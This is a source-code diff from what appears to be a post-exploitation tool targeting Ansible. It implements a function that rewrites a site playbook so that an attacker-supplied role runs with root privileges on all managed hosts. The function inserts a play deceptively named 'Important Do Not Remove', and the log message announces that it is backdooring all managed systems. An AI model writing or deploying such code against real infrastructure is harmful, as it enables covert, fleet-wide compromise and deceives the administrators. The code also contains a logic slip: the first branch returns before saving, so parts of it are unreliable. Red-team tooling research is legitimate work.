@@ -7,15 +7,15 @@ package main
 import (
 	"flag"
 	"fmt"
+	"github.com/CrimsonK1ng/mose/pkg/moseutils"
+	"github.com/gobuffalo/packr/v2"
+	"gopkg.in/yaml.v2"
 	"log"
 	"os"
 	"path/filepath"
 	"regexp"
 	"strings"
 	"text/template"
-
-	"github.com/gobuffalo/packr/v2"
-	"github.com/CrimsonK1ng/mose/pkg/moseutils"
 )
 
 type command struct {
@@ -32,6 +32,13 @@ type ansibleFiles struct {
 	vaultFile    string
 }
 
+type ansible []struct {
+	Name   string   `yaml:"name"`
+	Hosts  string   `yaml:"hosts"`
+	Become bool     `yaml:"become"`
+	Roles  []string `yaml:"roles"`
+}
+
 var (
 	a                = CreateAgent()
 	ansibleBackupLoc = a.AnsibleBackupLoc
@@ -46,7 +53,7 @@ var (
 		vaultFile:    "",
 	}
 	osTarget       = a.OsTarget
-	saltStateName  = a.PayloadName
+	ansibleRole    = a.PayloadName
 	uploadFileName = a.FileName
 	uploadFilePath = a.RemoteUploadFilePath
 	specific       bool
@@ -299,7 +306,46 @@ func generatePlaybooks() {
 }
 
 // TODO: this
-func backdoorSiteFile() {
+func backdoorSiteFile(siteLoc string) {
+	bytes, err := moseutils.ReadBytesFromFile(siteLoc)
+
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	unmarshalled := ansible{}
+	err = yaml.Unmarshal(bytes, unmarshalled)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	for i, item := range unmarshalled {
+		if strings.Compare(item.Hosts, "all") == 0 {
+
+			log.Printf("'Hosts: all' found, appending playbook to roles")
+			unmarshalled[i].Roles = append(unmarshalled[i].Roles, ansibleRole)
+			return
+		}
+	}
+
+	newItem := ansible{{
+		"Important Do Not Remove",
+		"all",
+		true,
+		[]string{ansibleRole},
+	}}
+	unmarshalled = append(unmarshalled, newItem[0])
+
+	marshalled, err := yaml.Marshal(&unmarshalled)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	err = moseutils.WriteFile(siteLoc, marshalled, 0644)
+	if err != nil {
+		log.Fatalf("error: %v", err)
+	}
+	log.Printf("%s successfully create", siteLoc)
 	// find the hosts: all section
 	// if it doesn't exist, create it
 	// make sure to put the backdoor at the bottom of roles
@@ -366,7 +412,7 @@ func main() {
 	// TODO: Need to implement message for file uploads
 	moseutils.Msg("Backdooring %s to run %s on all managed systems, please wait...", files.siteFile, a.Cmd)
 	// TODO: implement this
-	backdoorSiteFile()
+	backdoorSiteFile(files.siteFile)
 
 	log.Fatal("DIE")
 
